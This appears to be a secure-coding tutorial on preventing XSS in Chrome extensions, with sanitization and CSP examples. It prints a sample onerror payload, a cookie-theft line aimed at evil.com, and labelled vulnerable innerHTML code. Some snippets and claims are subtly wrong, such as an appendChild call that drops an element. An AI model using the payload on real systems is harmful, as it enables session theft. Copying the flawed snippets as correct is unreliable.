---
layout: default
title: "Prevent XSS in Chrome Extensions: Input Sanitization and Secure DOM Manipulation"
description: "Master XSS prevention in Chrome extensions with DOMPurify, Trusted Types, Sanitizer API, and secure DOM manipulation. Protect your extension from injection attacks."
canonical_url: "https://theluckystrike.github.io/chrome-extension-guide/guides/chrome-extension-xss-prevention-input-sanitization/"
---

# Prevent XSS in Chrome Extensions: Input Sanitization and Secure DOM Manipulation

Cross-site scripting (XSS) represents one of the most dangerous and prevalent security vulnerabilities affecting Chrome extensions. Unlike traditional web applications, Chrome extensions operate with elevated privileges and direct access to powerful browser APIs, making XSS vulnerabilities in extensions potentially far more damaging than in regular websites. An exploited XSS vulnerability in your extension can grant attackers access to sensitive user data, session cookies, browsing history, and even control over the user's browser. This comprehensive guide provides you with the knowledge, tools, and practical patterns needed to build XSS-resistant Chrome extensions that protect your users from these serious security threats.

Understanding XSS in the extension context requires recognizing that the attack surface extends far beyond typical web application vulnerabilities. Chrome extensions interact with web content, browser APIs, and cross-origin resources in ways that create unique attack vectors. Content scripts inject code into arbitrary web pages, popup pages handle sensitive user preferences, background scripts manage complex state, and message passing channels connect these disparate components. Each of these areas presents distinct opportunities for XSS exploitation if not properly secured.

## Extension-Specific XSS Vectors

Chrome extensions face XSS risks that differ significantly from standard web applications due to their unique architecture and privileges. The most critical distinction is that extensions operate in a privileged context with access to powerful APIs that regular websites cannot access. When an XSS vulnerability exists in an extension, attackers gain access to these elevated privileges, potentially allowing them to read all browser tabs, modify browsing behavior, access stored credentials, and exfiltrate sensitive data.

Content scripts represent the most exposed attack surface in most extensions. These scripts run within the context of web pages that you do not control, meaning any data received from the page or displayed to the page must be treated as potentially malicious. If your content script displays data from the page without proper sanitization, attackers can inject malicious scripts that execute with your extension's elevated privileges. This is particularly dangerous because content scripts share the DOM with the host page, creating numerous opportunities for injection through event handlers, JavaScript URLs, and dynamic content evaluation.

Background scripts, while not directly exposed to web page content, can still be vulnerable through message passing. If your extension allows content scripts or web pages to send messages to background scripts, and those messages are processed without validation, attackers can trigger malicious actions. Similarly, popup pages and options pages that display user-controlled data or data fetched from external sources require careful sanitization to prevent injection attacks.

The extension's own origin (chrome-extension://[extension-id]) provides some isolation from malicious web content, but this isolation is not absolute. Extensions must still handle data from untrusted sources including user input, messages from content scripts, responses from external APIs, and data stored in localStorage or chrome.storage. Each of these data sources represents a potential XSS vector if the data is not properly sanitized before rendering or execution.

## The Dangers of innerHTML

The innerHTML property represents one of the most common sources of XSS vulnerabilities in extension development. When you assign HTML content to innerHTML, the browser parses the string and constructs DOM elements, which means any embedded script tags or event handlers will be executed. This behavior makes innerHTML extremely dangerous when handling any data that originates from untrusted sources, including user input, web page content, API responses, or stored data.

Consider a typical extension feature that displays page information in a popup:

```javascript
// DANGEROUS: Never do this with untrusted data
function displayPageInfo(pageData) {
  const container = document.getElementById('info');
  container.innerHTML = `<h1>${pageData.title}</h1>
                         <p>${pageData.description}</p>
                         <img src="${pageData.imageUrl}">`;
}
```

If an attacker controls the pageData object, they can easily inject malicious scripts through payloads like `<img src=x onerror="alert('XSS')">` or steal cookies through `document.location='https://evil.com/?cookie='+document.cookie`.

The proper approach is to use textContent for text data, which automatically escapes HTML entities and treats all content as plain text:

```javascript
// SAFE: Using textContent for text data
function displayPageInfo(pageData) {
  const container = document.getElementById('info');
  container.textContent = ''; // Clear existing content
  
  const title = document.createElement('h1');
  title.textContent = pageData.title;
  
  const description = document.createElement('p');
  description.textContent = pageData.description;
  
  container.appendChild(title, description);
}
```

When you genuinely need to render HTML markup, you must sanitize the content first using a robust HTML sanitization library. Even when the data appears to come from a trusted source, malicious actors can often find ways to inject payloads, making sanitization essential for any HTML rendering.

## DOMPurify Integration

DOMPurify is the gold standard for HTML sanitization in JavaScript applications, and it should be your primary tool for safely rendering HTML content in Chrome extensions. Unlike simple regex-based sanitization approaches, DOMPurify uses a robust parsing engine that understands HTML semantics and can accurately strip dangerous elements while preserving safe formatting. It is actively maintained, thoroughly tested, and trusted by major organizations worldwide.

Integrating DOMPurify into your extension requires adding the library to your project and using it consistently whenever you need to render HTML:

```javascript
import DOMPurify from 'dompurify';

// Safe HTML rendering with DOMPurify
function renderUserContent(htmlContent) {
  const container = document.getElementById('content');
  // Configure DOMPurify to allow specific tags and attributes
  const clean = DOMPurify.sanitize(htmlContent, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'p', 'br', 'ul', 'ol', 'li'],
    ALLOWED_ATTR: ['class'],
    ALLOW_DATA_ATTR: false
  });
  container.innerHTML = clean;
}
```

The key to effective DOMPurify usage is the configuration. The library is designed to be restrictive by default, allowing only safe tags and attributes. You should carefully evaluate what your extension actually needs and configure the whitelist accordingly. Avoid the temptation to use `ALLOWED_TAGS: []` or overly permissive configurations just to make development easier, as this defeats the purpose of using a sanitization library.

For extensions that need to display more complex HTML, such as user-generated content or content scraped from websites, consider using DOMPurify in conjunction with sandboxed pages. The [Content Security Policy guide](../guides/chrome-extension-content-security-policy.md) explains how to configure sandbox pages that run in an isolated context with no access to extension APIs, providing an additional layer of security for rendering untrusted HTML.

## Trusted Types API

The Trusted Types API represents a modern approach to preventing DOM XSS attacks by enabling policies that restrict dangerous DOM operations. When enabled, browsers prevent assignment to innerHTML, document.write, and other high-risk APIs unless the content comes from a trusted type created by your policy. This transforms XSS prevention from a runtime responsibility into a compile-time and enforcement-time guarantee.

Implementing Trusted Types in your extension requires defining a policy that controls how HTML, scripts, and other potentially dangerous content can be created:

```javascript
// Create a Trusted Types policy
const policy = trustedTypes.createPolicy('extensionPolicy', {
  createHTML: (input) => DOMPurify.sanitize(input),
  createScript: (input) => {
    // Only allow pre-approved scripts
    if (!isApprovedScript(input)) {
      throw new Error('Script not approved');
    }
    return input;
  }
});

// Safe innerHTML usage through Trusted Types
function displayContent(content) {
  const trusted = policy.createHTML(content);
  document.getElementById('container').innerHTML = trusted;
}
```

To enable Trusted Types in your extension, add the appropriate Content Security Policy directive in your manifest:

```json
{
  "content_security_policy": {
    "extension_pages": "script-src 'self'; object-src 'none'; trusted-types default extensionPolicy"
  }
}
```

Trusted Types provide excellent defense in depth, but they work best when combined with other security measures. Not all browsers support Trusted Types equally, and some legacy code patterns may be difficult to migrate. Consider Trusted Types as an additional layer of protection rather than a replacement for proper sanitization with DOMPurify.

## Message Passing Sanitization

Chrome extensions rely heavily on message passing between content scripts, background scripts, popup pages, and options pages. This communication pattern creates security implications because messages often contain data from untrusted sources that must be validated before processing or display. Understanding how to properly secure message passing is essential for building secure extensions.

Content scripts are particularly vulnerable because they receive messages from the background script but also have access to the DOM of potentially malicious web pages. Any data passed through message channels should be treated as untrusted and sanitized appropriately:

```javascript
// Content script: Receiving messages from background
chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
  if (message.type === 'displayData') {
    // Always sanitize data received via message passing
    const sanitized = DOMPurify.sanitize(message.content);
    document.getElementById('container').innerHTML = sanitized;
  }
});

// Background script: Validate before sending
function sendDataToContent(tabId, data) {
  // Validate data before sending
  const validated = validateAndSanitize(data);
  chrome.tabs.sendMessage(tabId, {
    type: 'displayData',
    content: validated
  });
}
```

Implement a validation layer for all message handlers that checks message structure, validates data types, and sanitizes content before using it. This is especially important for messages that will be rendered in the DOM or used in security-sensitive operations.

The [Secure Message Passing](../guides/chrome-extension-secure-message-passing.md) guide provides comprehensive coverage of security patterns for extension message passing, including input validation, output encoding, and communication channel security.

## Content Script Injection Risks

Content scripts run in the context of web pages that you do not control, making them particularly susceptible to injection attacks. Even if your content script itself is secure, it interacts with a potentially hostile environment that can attack your code in various ways. Understanding these risks helps you design content scripts that remain secure despite their challenging execution environment.

One common attack vector is DOM manipulation by the host page after your content script runs. If your script stores references to DOM elements and later uses those references, a malicious page could have modified those elements or their properties between your access and usage. Always obtain DOM references immediately before use rather than storing them:

```javascript
// VULNERABLE: Stored DOM reference
let container;
function init() {
  container = document.getElementById('target');
}
function render(data) {
  container.innerHTML = data; // Page could have replaced this element
}

// SECURE: Immediate DOM access
function render(data) {
  const container = document.getElementById('target');
  container.textContent = data;
}
```

Another risk comes from prototype pollution and property injection in JavaScript objects. If your content script uses objects from the page context, malicious code could have modified prototypes to inject behavior. Always use objects created in your own context, and be cautious about using Object.assign or spread operators with page-provided data.

## Popup and Options Page Security

Popup pages and options pages represent your extension's primary user interface, and they handle sensitive data including user preferences, authentication credentials, and extension state. These pages must be secured against both external attackers and malicious web content that might attempt to exploit them through various channels.

Never assume that data stored in chrome.storage is safe to display without sanitization. While storage is isolated from web page access, the data could have been injected by a compromised content script or background script. Always validate and sanitize data from storage before rendering it in the DOM:

```javascript
// Retrieve and sanitize stored data before display
async function loadPreferences() {
  const data = await chrome.storage.local.get(['userData']);
  const container = document.getElementById('preferences');
  
  if (data.userData && data.userData.name) {
    // Always sanitize before innerHTML
    container.textContent = data.userData.name;
  }
}
```

Options pages that allow users to configure extension behavior should validate all input before saving. Malicious extensions or compromised contexts could potentially send messages to your options page with crafted payloads. Implement robust input validation that checks data types, lengths, and formats before accepting any configuration changes.

## Content Security Policy as Defense Layer

Content Security Policy provides the foundation of your extension's XSS defense strategy. While sanitization libraries like DOMPurify protect against XSS in specific code paths, CSP establishes broad protections that defend your entire extension automatically. A properly configured CSP can block XSS attacks even when your code contains vulnerabilities, providing crucial defense in depth.

The [Content Security Policy Guide](../guides/chrome-extension-content-security-policy.md) covers CSP configuration in detail, but the essential principle for XSS prevention is restricting script sources to trusted origins only. Your CSP should allow scripts only from your extension's origin, and you should explicitly disable dynamic script execution:

```json
{
  "content_security_policy": {
    "extension_pages": "script-src 'self'; object-src 'none'; style-src 'self' 'unsafe-inline'"
  }
}
```

The object-src 'none' directive is particularly important for XSS prevention because it blocks plugins and embedded content that could be used for injection attacks. Combined with script-src 'self', this configuration prevents most forms of XSS from succeeding even if your code contains vulnerabilities.

## The Sanitizer API

The Sanitizer API represents the modern browser-native approach to HTML sanitization, currently supported in Chrome and other Chromium-based browsers. Unlike DOMPurify, which requires including an external library, the Sanitizer API is built into the browser and provides standardized, performant sanitization without dependencies:

```javascript
// Using the native Sanitizer API
const sanitizer = new Sanitizer({
  allowedTags: ['b', 'i', 'em', 'strong', 'p', 'br'],
  allowedAttributes: { 'class': [] }
});

function sanitizeAndRender(htmlString) {
  const container = document.getElementById('content');
  // Sanitizer.setHTML parses and sanitizes in one step
  sanitizer.setHTML(container, htmlString);
}
```

The Sanitizer API provides security guarantees that match or exceed DOMPurify while offering better performance through native browser optimization. However, browser support is still limited compared to DOMPurify, so you may need to use feature detection and provide a fallback for older browsers:

```javascript
function sanitizeHtml(input) {
  if ('Sanitizer' in window) {
    const sanitizer = new Sanitizer({});
    return sanitizer.sanitizeFor('div', input).innerHTML;
  } else {
    // Fallback for browsers without Sanitizer API
    return DOMPurify.sanitize(input);
  }
}
```

## Automated Security Scanning

Automated tools can help identify XSS vulnerabilities and other security issues in your extension code before attackers find them. Integrating security scanning into your development workflow catches vulnerabilities early when they are easier and cheaper to fix. Several tools are specifically useful for Chrome extension security analysis.

Linting tools like ESLint can be configured with security-focused rules that detect potentially dangerous patterns in your code. Plugins like eslint-plugin-security identify common vulnerability patterns including use of innerHTML with untrusted data, eval usage, and other risky patterns:

```javascript
// ESLint configuration for security
{
  "plugins": ["security"],
  "rules": {
    "security/detect-unsafe-regex": "error",
    "security/detect-non-literal-fs-filename": "error",
    "security/detect-non-literal-regexp": "error",
    "security/detect-eval-with-expression": "error",
    "security/detect-possible-timing-attacks": "error",
    "security/detect-pseudoRandomBytes": "error"
  }
}
```

Extension-specific security scanners can analyze your manifest.json and extension structure for common issues. The Chrome Web Store now performs automated security analysis during review, but catching issues earlier in development is always preferable.

## OWASP for Chrome Extensions

The Open Web Application Security Project (OWASP) maintains resources specifically relevant to Chrome extension security. While the OWASP Top 10 focuses on web applications, the organization also provides guidance on extension-specific vulnerabilities and attack vectors that every extension developer should understand.

Key OWASP resources for extension developers include guidance on injection prevention, proper input validation, secure coding practices, and threat modeling. The principles align with general web security best practices but require specific attention to the unique characteristics of extension architecture.

Reviewing your extension against OWASP guidelines during development helps ensure you have addressed the most common and impactful security vulnerabilities. The [Security Hardening Guide](../guides/security-hardening.md) provides practical implementation patterns that align with OWASP recommendations for Chrome extensions.

## Conclusion

Building XSS-resistant Chrome extensions requires a defense-in-depth approach that combines multiple security measures. Never rely on a single technique; instead, layer sanitization, CSP, input validation, and secure coding practices to create robust protection against injection attacks. DOMPurify or the native Sanitizer API should be used for any HTML rendering, Trusted Types provide modern protection where supported, and Content Security Policy establishes baseline defense across your entire extension.

Remember that extension privileges amplify the impact of XSS vulnerabilities, making security investment particularly important. Treat all external data as potentially malicious, validate and sanitize rigorously, and test your extension against common attack patterns. Your users trust you with their browsing experience and data, and that trust requires unwavering commitment to security best practices.

---

*Part of the Chrome Extension Guide by theluckystrike. More at [zovo.one](https://zovo.one)*
